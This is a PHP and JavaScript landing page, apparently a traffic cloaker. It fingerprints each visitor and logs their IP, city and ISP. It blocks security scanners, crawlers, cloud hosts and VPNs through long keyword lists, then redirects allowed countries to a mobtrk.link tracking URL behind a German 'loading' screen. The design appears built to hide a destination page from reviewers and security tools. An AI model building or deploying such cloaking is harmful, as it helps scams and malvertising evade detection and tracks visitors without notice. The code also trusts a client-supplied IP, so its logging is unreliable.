<?php

/**
 * Advanced Visitor Filtering System
 * 
 * Implements client-side detection with server-side logging
 * to filter unwanted traffic.
 */

// Configuration - minimal server-side config, most logic moved to frontend
$config = [
    'log_file' => 'visitors.log',
    'allowed_countries' => ['MA','DE','AT','CH'],
    'target_url' => 'https://mobtrk.link/view.php?id=5539903&pub=647149',
    'fallback_url' => 'https://mobtrk.link/view.php?id=5539903&pub=647149'
];

// IP blocking functionality has been removed

// Initialize variables - only needed for logging
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

// Get the current request information
$request_uri = $_SERVER['REQUEST_URI'] ?? '';
$request_method = $_SERVER['REQUEST_METHOD'] ?? '';

// IP blocking check has been removed

// Function to safely log visitor data
function logVisitor($data, $logFile)
{
    $timestamp = date('Y-m-d H:i:s');
    $logEntry = "[{$timestamp}] " . implode(' | ', $data) . "\n";

    // Create log file if it doesn't exist
    if (!file_exists($logFile)) {
        // Create initial log entry with headers
        $headers = "[TIMESTAMP] IP | COUNTRY_NAME | COUNTRY_CODE | CITY | TIMEZONE | STATUS | BLOCK_REASON | USER_AGENT | OS | BROWSER | VERSION | ISP | ORG | DETECTION_FLAGS\n";
        file_put_contents($logFile, $headers, FILE_APPEND | LOCK_EX);
    }

    // Append to log file
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

    // Ensure file permissions are correct
    chmod($logFile, 0644);
}

// Function to parse user agent
function parseUserAgent($ua)
{
    $os = 'Unknown';
    $browser = 'Unknown';
    $version = 'Unknown';

    // Detect OS
    if (preg_match('/windows|win32|win64/i', $ua)) {
        $os = 'Windows';
    } elseif (preg_match('/macintosh|mac os x/i', $ua)) {
        $os = 'macOS';
    } elseif (preg_match('/android/i', $ua)) {
        $os = 'Android';
    } elseif (preg_match('/iphone|ipad|ipod/i', $ua)) {
        $os = 'iOS';
    } elseif (preg_match('/linux/i', $ua)) {
        $os = 'Linux';
    }

    // Detect browser and version
    if (preg_match('/MSIE|Trident/i', $ua)) {
        $browser = 'Internet Explorer';
        preg_match('/(?:MSIE |rv:)([\d.]+)/i', $ua, $matches);
        $version = $matches[1] ?? 'Unknown';
    } elseif (preg_match('/Firefox\/([\d.]+)/i', $ua, $matches)) {
        $browser = 'Firefox';
        $version = $matches[1] ?? 'Unknown';
    } elseif (preg_match('/Chrome\/([\d.]+)/i', $ua, $matches)) {
        if (preg_match('/Edg\/([\d.]+)/i', $ua)) {
            $browser = 'Edge';
            preg_match('/Edg\/([\d.]+)/i', $ua, $matches);
            $version = $matches[1] ?? 'Unknown';
        } elseif (preg_match('/OPR\/([\d.]+)/i', $ua, $matches)) {
            $browser = 'Opera';
            $version = $matches[1] ?? 'Unknown';
        } else {
            $browser = 'Chrome';
            $version = $matches[1] ?? 'Unknown';
        }
    } elseif (preg_match('/Safari\/([\d.]+)/i', $ua)) {
        $browser = 'Safari';
        preg_match('/Version\/([\d.]+)/i', $ua, $matches);
        $version = $matches[1] ?? 'Unknown';
    }

    return [
        'os' => $os,
        'browser' => $browser,
        'version' => $version
    ];
}

// Handle server-side logging from client detection
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['detection_data'])) {
    header('Content-Type: application/json');

    // Get the detection data
    $data = json_decode($_POST['detection_data'], true);

    // Process and sanitize client data
    if (!$data) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid data format']);
        exit;
    }

    // Extract and sanitize fields
    $clientIP = filter_var($data['ip'] ?? $ip, FILTER_SANITIZE_STRING); // Use client-detected IP if available
    $countryName = filter_var($data['country'] ?? 'unknown', FILTER_SANITIZE_STRING);
    $countryCode = filter_var($data['countryCode'] ?? 'XX', FILTER_SANITIZE_STRING);
    $city = filter_var($data['city'] ?? 'unknown', FILTER_SANITIZE_STRING);
    $timezone = filter_var($data['timezone'] ?? 'unknown', FILTER_SANITIZE_STRING);
    $proxy = filter_var($data['proxy'] ?? false, FILTER_VALIDATE_BOOLEAN) ? 'true' : 'false';
    $hosting = filter_var($data['hosting'] ?? false, FILTER_VALIDATE_BOOLEAN) ? 'true' : 'false';
    $status = filter_var($data['status'] ?? 'unknown', FILTER_SANITIZE_STRING);
    $blockReason = filter_var($data['blockReason'] ?? 'none', FILTER_SANITIZE_STRING);
    $isp = filter_var($data['isp'] ?? 'unknown', FILTER_SANITIZE_STRING);
    $org = filter_var($data['org'] ?? 'unknown', FILTER_SANITIZE_STRING);
    $detectionFlags = filter_var($data['detectionFlags'] ?? '', FILTER_SANITIZE_STRING);

    // Get user agent info
    $uaInfo = parseUserAgent($ua);

    // Log the visitor data
    logVisitor([
        $clientIP, // Use client-detected IP instead of server IP
        $countryName,
        $countryCode,
        $city,
        $timezone,
        $status,
        $blockReason,
        $ua,
        $uaInfo['os'],
        $uaInfo['browser'],
        $uaInfo['version'],
        $isp,
        $org,
        $detectionFlags
    ], $config['log_file']);

    echo json_encode(['status' => 'success']);
    exit;
}

// Create initial log file if it doesn't exist
if (!file_exists($config['log_file'])) {
    // Create the log file with just the header
    $headers = "[TIMESTAMP] IP | COUNTRY_NAME | COUNTRY_CODE | CITY | TIMEZONE | STATUS | BLOCK_REASON | USER_AGENT | OS | BROWSER | VERSION | REQUESTS | ISP | ORG | DETECTION_FLAGS\n";
    file_put_contents($config['log_file'], $headers, LOCK_EX);
}

// For direct page visits, we'll just serve the detection page
// All detection logic is in the JavaScript

// No longer need nonce since HMAC validation is removed
?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
        }
        
        .container {
            text-align: center;
        }
        
        .loader {
            width: 60px;
            height: 60px;
            border: 6px solid #e6e6e6;
            border-top: 6px solid #FF9900;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            color: #333;
            font-size: 18px;
            font-weight: bold;
        }
        
        .loading-text:after {
            content: "...";
            display: inline-block;
            width: 20px;
            text-align: left;
            animation: dots 1.5s infinite;
        }
        
        @keyframes dots {
            0%, 20% { content: "."; }
            40% { content: ".."; }
            60%, 100% { content: "..."; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <div class="loading-text">Wird geladen</div>
    </div>

    <script>
        (function() {
            // Advanced Visitor Filtering System - Client-side detection

            // Configuration - all detection logic moved to frontend
            const config = {
                ipApiUrl: 'http://ip-api.com/json?fields=status,message,country,countryCode,city,timezone,isp,org,as,proxy,hosting,query',
                allowedCountries: <?php echo json_encode($config['allowed_countries']); ?>, // Allowed countries defined directly in frontend
                targetUrl: <?php echo json_encode($config['target_url']); ?>,
                fallbackUrl: <?php echo json_encode($config['fallback_url']); ?>,
                // Enhanced bot signatures for better detection
                botSignatures: [
                    // Common bots and crawlers
                    'bot', 'crawl', 'spider', 'archiver', 'archive', 'curl', 'wget', 'python-', 'http-client', 'java-',
                    'perl/', 'php/', 'ruby/', 'go-http', 'node-', 'phantom', 'headless',
                    'scraper', 'scraping', 'fetcher', 'fetch', 'request', 'downloader', 'collector', 'extractor',
                    'parser', 'monitor', 'checker', 'validator', 'analyzer', 'indexer', 'reader', 'browser',
                    'agent', 'client', 'library', 'tool', 'automatic', 'machine', 'program', 'script',

                    // Search engine and social media bots
                    'googlebot', 'google-inspectiontool', 'bingbot', 'bingpreview', 'yandexbot', 'yandeximages',
                    'duckduckbot', 'duckduckgo-favicons', 'slurp', 'baiduspider', 'bytespider', 'sogou',
                    'facebookexternalhit', 'facebookcatalog', 'twitterbot', 'pinterest', 'whatsapp', 'telegrambot',
                    'rogerbot', 'linkedinbot', 'discordbot', 'slackbot', 'redditbot', 'tumblr', 'weibo',
                    'line-poker', 'line-spider', 'vkShare', 'quora', 'qwantify', 'applebot', 'petalbot',

                    // Headless browsers and automation tools
                    'puppeteer', 'selenium', 'selenium', 'webdriver', 'chromedriver', 'geckodriver',
                    'iedriver', 'operadriver', 'safaridriver', 'appium', 'cypress', 'playwright',
                    'nightmare', 'electron', 'jsdom', 'wkhtmltopdf', 'wkhtmltoimage', 'httrack', 'zombie',
                    'casper', 'slimerjs', 'triflejs', 'lobster', 'splash', 'ripper', 'mechanize',

                    // HTTP libraries and frameworks
                    'python-requests', 'python-urllib', 'scrapy', 'beautifulsoup', 'beautiful soup', 'mechanize',
                    'ruby', 'nokogiri', 'typhoeus', 'faraday', 'go-http-client', 'grequests', 'urllib3',
                    'node-fetch', 'axios', 'superagent', 'request-promise', 'got', 'needle', 'unirest',
                    'aiohttp', 'httpx', 'guzzle', 'guzzlehttp', 'okhttp', 'retrofit', 'restsharp', 'jquery',
                    'cheerio', 'jsoup', 'htmlunit', 'htmlparser', 'simplehtmldom', 'domdocument',

                    // Monitoring and analytics bots
                    'newrelic', 'datadog', 'sentry', 'pingdom', 'uptimerobot', 'statuscake', 'gtmetrix',
                    'pagespeed', 'lighthouse', 'webpagetest', 'speedcurve', 'site24x7', 'nagios', 'zabbix',
                    'prerender', 'rendertron', 'seobility', 'screaming frog', 'deepcrawl', 'sitebulb',
                    'semrush', 'ahrefs', 'majestic', 'moz', 'similarweb', 'mixpanel', 'hotjar',

                    // Security scanners and vulnerability checkers
                    'nmap', 'nessus', 'openvas', 'nikto', 'wpscan', 'sqlmap', 'burp', 'owasp', 'zap',
                    'acunetix', 'appscan', 'netsparker', 'qualys', 'rapid7', 'nessus', 'metasploit',
                    'w3af', 'arachni', 'skipfish', 'wafw00f', 'dirbuster', 'gobuster', 'ffuf',

                    // Malicious and spam bots
                    'spambot', 'emailcollector', 'harvest', 'hunter', 'extractor', 'spammer', 'phishing',
                    'malware', 'virus', 'trojan', 'exploit', 'injector', 'bruteforce', 'scanner', 'hack',
                    'ddos', 'backdoor', 'rootkit', 'keylogger', 'rat', 'adware', 'spyware', 'ransomware',

                    // API and feed bots
                    'postman', 'insomnia', 'swagger', 'openapi', 'graphql', 'rest', 'soap', 'xmlrpc',
                    'rss', 'atom', 'feed', 'json', 'webhook', 'ifttt', 'zapier', 'integromat',

                    // Cloud and hosting providers
                    'aws', 'amazon', 'azure', 'microsoft', 'gcp', 'googlecloud', 'cloudflare', 'fastly',
                    'akamai', 'linode', 'digitalocean', 'heroku', 'vercel', 'netlify', 'render',

                    // VPN and proxy services
                    'vpn', 'proxy', 'tor', 'anonymizer', 'hideip', 'shield', 'cloak', 'mask',

                    // Miscellaneous
                    'wordpress', 'joomla', 'drupal', 'magento', 'shopify', 'prestashop', 'opencart',
                    'phpmyadmin', 'admin', 'wp-login', 'xml', 'sitemap', 'robots.txt', 'favicon',
                    'cron', 'job', 'worker', 'daemon', 'service', 'task', 'scheduler'
                ],
                // Suspicious ISPs moved to frontend
                suspiciousIsps: [
                    // ===== Major Cloud Providers (AWS, Google, Azure, etc.) =====
                    'Amazon', 'AWS', 'Amazon Web Services', 'Google', 'Google LLC', 'Google Cloud', 'GCP',
                    'Google Fiber', 'Microsoft', 'Azure', 'MS Azure', 'Oracle Cloud', 'IBM Cloud', 'IBM',
                    'Alibaba Cloud', 'Aliyun', 'Tencent Cloud', 'Baidu Cloud', 'Huawei Cloud', 'Yandex Cloud',

                    // ===== VPS & Hosting Providers =====
                    'DigitalOcean', 'DO', 'Linode', 'Akamai', 'Akamai Technologies', 'Cloudflare', 'Fastly',
                    'OVH', 'OVHcloud', 'Hetzner', 'Hetzner Online', 'Hetzner AU', 'Vultr', 'Contabo',
                    'Scaleway', 'UpCloud', 'Rackspace', 'DreamHost', 'Hostinger', 'Bluehost', 'GoDaddy',
                    'Namecheap', 'SiteGround', 'Liquid Web', 'A2 Hosting', 'InMotion Hosting', 'HostGator',
                    'Ionos', '1&1', 'Strato', 'Kinsta', 'WP Engine', 'Flywheel',

                    // ===== Proxy, VPN & Anonymization Networks =====
                    'Tor Network', 'Tor Exit Node', 'NordVPN', 'ExpressVPN', 'CyberGhost', 'Surfshark',
                    'Private Internet Access', 'PIA', 'ProtonVPN', 'Proton Technologies', 'Windscribe',
                    'Hotspot Shield', 'HideMyAss', 'HMA', 'IPVanish', 'VyprVPN', 'TunnelBear', 'Mullvad',
                    'Perfect Privacy', 'AzireVPN', 'Trust.zone', 'SlickVPN', 'VPN Unlimited', 'ZenMate',

                    // ===== Known Scraping & Bot Proxy Services =====
                    'Bright Data', 'Luminati', 'Oxylabs', 'Smartproxy', 'GeoSurf', 'NetNut', 'Storm Proxies',
                    'Blazing SEO', 'Microleaves', 'Shifter', 'ScraperAPI', 'ScrapingBee', 'Zyte', 'Apify',
                    'Crawlera', 'PhantomJS Cloud', 'Browserless', 'ScrapingAnt', 'ScraperBox', 'ProxyCrawl',

                    // ===== Data Center & Colocation Providers =====
                    'Equinix', 'Digital Realty', 'Cyxtera', 'Coresite', 'Interxion', 'NTT', 'NTT America',
                    'Cogent', 'Cogent Communications', 'Level 3', 'Zayo', 'GTT', 'Tata Communications',
                    'Lumen', 'CenturyLink', 'Comcast Business', 'Verizon Business', 'AT&T Business',

                    // ===== High-Risk & Budget Hosting (Often Used for Abuse) =====
                    'ColoCrossing', 'Psychz', 'BuyVM', 'RamNode', 'LeaseWeb', 'ServerMania', 'DediPath',
                    'Time4VPS', 'NetShop ISP', 'WebNX', 'Choopa', 'QuadraNet', 'DataPacket', 'FranTech',
                    'Wholesale Internet', 'SharkTech', 'NFOrce', 'VolumeDrive', 'ReliableSite', 'AlphaVPS',

                    // ===== Chinese, Russian & High-Risk Regions =====
                    'Tencent', 'Baidu', 'China Telecom', 'China Unicom', 'China Mobile', 'ChinaNet',
                    'Selectel', 'RuVDS', 'FirstByte', 'Mirohost', 'Beget', 'Reg.ru', 'Webzilla',
                    'Flops.ru', 'Hostkey', 'DDoS-Guard', 'ITLDC', 'King Servers', 'Zomro',

                    // ===== Free Hosting & Dynamic IP Ranges =====
                    'No-IP', 'DynDNS', 'Free IP', 'Dynamic IP', 'Residential Proxy', 'Mobile Proxy',
                    'L2TP', 'PPTP', 'OpenVPN', 'WireGuard', 'SOCKS5', 'Shadowsocks', 'Hola VPN',
                    'KProxy', 'Hide.me', 'VPNBook', 'FreeVPN', 'ProXPN', 'Faceless.ME',

                    // ===== CDN & Edge Networks (Sometimes Abused) =====
                    'StackPath', 'EdgeCast', 'Limelight', 'BunnyCDN', 'KeyCDN', 'CDN77', 'BelugaCDN',
                    'CloudFront', 'Fastly', 'Imperva', 'Incapsula', 'Sucuri', 'QUIC.cloud', 'Section.io'
                ]
            };

            // We're now using the bot signatures and ISPs from the config object
            // for better maintainability

            // Detection flags
            let detectionFlags = [];

            // Enhanced check for bot signatures in user agent
            function checkUserAgent() {
                const ua = navigator.userAgent.toLowerCase();
                
                // Skip common legitimate browsers
                const legitimateBrowsers = [
                    'firefox', 'chrome', 'safari', 'edge', 'opera', 'msie', 'trident', 'vivaldi', 'brave'
                ];
                
                // Check if this is a legitimate browser
                let isLegitimate = false;
                for (const browser of legitimateBrowsers) {
                    if (ua.includes(browser)) {
                        isLegitimate = true;
                        break;
                    }
                }
                
                // If it's a legitimate browser, don't flag it
                if (isLegitimate) {
                    return false;
                }
                
                // Check for bot signatures
                for (const signature of config.botSignatures) {
                    if (ua.includes(signature.toLowerCase())) {
                        detectionFlags.push(`bot_signature:${signature}`);
                        return true;
                    }
                }

                // Check for empty or suspicious user agent
                if (ua.length < 10 || ua === 'mozilla' || ua.includes('unknown')) {
                    detectionFlags.push('suspicious_ua:too_short_or_generic');
                    return true;
                }

                // Check for user agent inconsistencies
                if ((ua.includes('windows') && ua.includes('android')) ||
                    (ua.includes('iphone') && ua.includes('windows')) ||
                    (ua.includes('linux') && ua.includes('iphone'))) {
                    detectionFlags.push('suspicious_ua:platform_inconsistency');
                    return true;
                }

                return false;
            }

            // Check ISP against known bot ISPs
            function checkIsp(isp) {
                if (!isp) return false;

                const ispLower = isp.toLowerCase();
                for (const botIsp of config.suspiciousIsps) {
                    if (ispLower.includes(botIsp.toLowerCase())) {
                        detectionFlags.push(`suspicious_isp:${botIsp}`);
                        return true;
                    }
                }

                return false;
            }

            // Check timezone inconsistencies
            function checkTimezone() {
                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;

                // Check for empty/non-standard timezones
                if (!tz || tz === 'UTC' || tz === 'GMT' || tz === 'Etc/UTC' || tz === 'Etc/GMT') {
                    detectionFlags.push(`suspicious_tz:${tz || 'empty'}`);
                    return true;
                }

                return false;
            }

            // Enhanced check for browser features and inconsistencies
            function checkBrowserFeatures() {
                // Check for automation indicators
                if (navigator.webdriver) {
                    detectionFlags.push('webdriver:true');
                    return true;
                }

                // Check for headless browser indicators
                const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
                const hasOrientation = 'orientation' in window;
                const hasMimeTypes = navigator.mimeTypes && navigator.mimeTypes.length > 0;
                const hasPlugins = navigator.plugins && navigator.plugins.length > 0;

                // Mobile device should have touch and orientation
                const isMobileUA = /android|iphone|ipad|mobile/i.test(navigator.userAgent.toLowerCase());
                if (isMobileUA && (!hasTouch || !hasOrientation)) {
                    detectionFlags.push('inconsistent:mobile_without_touch');
                    return true;
                }

                // Check for Chrome with no plugins (potential headless)
                const isChrome = /chrome/i.test(navigator.userAgent.toLowerCase());
                if (isChrome && (!hasPlugins || !hasMimeTypes)) {
                    detectionFlags.push('inconsistent:chrome_without_plugins');
                    return true;
                }

                // Check for inconsistent screen properties
                if (window.screen.width < 2 || window.screen.height < 2 ||
                    window.screen.availWidth < 2 || window.screen.availHeight < 2) {
                    detectionFlags.push('suspicious:invalid_screen_dimensions');
                    return true;
                }

                return false;
            }

            // Enhanced behavioral analysis for bot detection
            function performBehavioralAnalysis() {
                // Check for browser automation frameworks
                if (window.callPhantom || window._phantom || window.__nightmare ||
                    window.domAutomation || window.domAutomationController ||
                    window.__selenium_unwrapped ||
                    window.__webdriver_script_fn ||
                    window.document.__selenium_unwrapped) {
                    detectionFlags.push('automation:framework_detected');
                    return true;
                }

                // Check for iframe embedding
                if (window !== window.top) {
                    detectionFlags.push('iframe:embedded');
                    return true;
                }

                // Check for DevTools protocol
                if (window.chrome && window.chrome.loadTimes) {
                    try {
                        // This will throw an error if DevTools is open
                        new window.chrome.loadTimes();
                    } catch (e) {
                        detectionFlags.push('devtools:possible');
                        // Not returning true as this alone isn't conclusive
                    }
                }

                // Check for suspicious performance timing
                if (window.performance && window.performance.timing) {
                    const timing = window.performance.timing;
                    // Bots often have unusually fast load times
                    if (timing.domComplete - timing.domLoading < 10) {
                        detectionFlags.push('performance:suspicious_timing');
                        return true;
                    }
                }

                return false;
            }

            // Send detection data to server
            function logDetectionToServer(data) {
                // Convert detection flags array to string if needed
                if (Array.isArray(data.detectionFlags)) {
                    data.detectionFlags = data.detectionFlags.join(',');
                }
                
                // Send detection data to server
                fetch(window.location.href, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: 'detection_data=' + encodeURIComponent(JSON.stringify(data))
                })
                .then(response => response.json())
                .then(responseData => {
                    // Check if the server has determined this IP is blocked
                    if (responseData.status === 'blocked') {
                        console.log('Server blocked this IP:', responseData.reason);
                        // Use the server's redirect URL if provided
                        if (responseData.redirect) {
                            // Redirect immediately without delay
                            window.location.href = responseData.redirect;
                        }
                    }
                })
                .catch(error => {
                    console.error('Error logging to server:', error);
                });
            }

            // Main detection function
            function detectVisitor() {
                // First perform client-side checks
                const isBot = checkUserAgent();
                const hasBadTimezone = checkTimezone();
                const hasBrowserInconsistencies = checkBrowserFeatures();
                const hasSuspiciousBehavior = performBehavioralAnalysis();

                // If any client-side checks fail, redirect immediately
                if (isBot || hasBadTimezone || hasBrowserInconsistencies || hasSuspiciousBehavior) {
                    logDetectionToServer({
                        ip: 'unknown', // No IP available yet
                        countryCode: 'unknown',
                        proxy: 'unknown',
                        hosting: 'unknown',
                        isp: 'unknown',
                        org: 'unknown',
                        detectionFlags: detectionFlags, // Pass the array directly
                        status: 'blocked',
                        blockReason: 'client_side_detection'
                    });

                    setTimeout(() => {
                        window.location.href = config.fallbackUrl;
                    }, 500);
                    return;
                }

                // Fetch IP geolocation data
                fetch(config.ipApiUrl)
                    .then(response => response.json())
                    .then(data => {
                        // Check country restriction
                        const countryAllowed = config.allowedCountries.includes(data.countryCode?.toUpperCase());

                        // Check proxy/VPN/hosting detection
                        const isProxy = data.proxy === true;
                        const isHosting = data.hosting === true;
                        const isp = data.isp || 'unknown';
                        const org = data.org || 'unknown';
                        const isIspSuspicious = checkIsp(isp);

                        // Determine status and block reason - only based on country now
                        let status = countryAllowed ? 'clean' : 'blocked';
                        let blockReason = countryAllowed ? 'none' : 'geo_restriction';
                        
                        // Still log detection flags for informational purposes
                        if (!countryAllowed) {
                            detectionFlags.push(`geo:${data.countryCode || 'unknown'}`);
                        }
                        
                        if (isProxy) {
                            detectionFlags.push('proxy:detected');
                        }
                        
                        if (isHosting) {
                            detectionFlags.push('hosting:detected');
                        }
                        
                        if (isIspSuspicious) {
                            detectionFlags.push(`suspicious_isp:${isp}`);
                        }

                        // Get timezone from API or browser
                        const timezone = data.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';

                        // Log detection data to server
                        logDetectionToServer({
                            ip: data.query || 'unknown', // Get actual IP from API response
                            country: data.country || 'unknown',
                            countryCode: data.countryCode || 'unknown',
                            city: data.city || 'unknown',
                            timezone: timezone,
                            proxy: isProxy,
                            hosting: isHosting,
                            isp: isp,
                            org: org,
                            detectionFlags: detectionFlags, // Pass the array directly
                            status: status,
                            blockReason: blockReason
                        });

                        // Determine redirect based only on country check
                        const redirectUrl = countryAllowed ? config.targetUrl : config.fallbackUrl;
                        
                        // Redirect after a short delay
                        setTimeout(() => {
                            window.location.href = redirectUrl;
                        }, 500);
                    })
                    .catch(error => {
                        console.error('Error fetching IP data:', error);

                        // Log error and redirect to fallback
                        detectionFlags.push('api_error:ip_api_failed');

                        logDetectionToServer({
                            ip: 'unknown', // No IP available in error case
                            country: 'Error',
                            countryCode: 'XX',
                            city: 'Error',
                            timezone: 'Unknown',
                            proxy: false,
                            hosting: false,
                            isp: 'Error',
                            org: 'Error',
                            detectionFlags: detectionFlags, // Pass the array directly
                            status: 'blocked',
                            blockReason: 'api_error'
                        });

                        // Redirect to fallback URL after a short delay
                        setTimeout(() => {
                            window.location.href = config.fallbackUrl;
                        }, 500);
                    });
            }

            // Start detection after a short delay
            setTimeout(detectVisitor, 300);
        })();
    </script>
</body>

</html>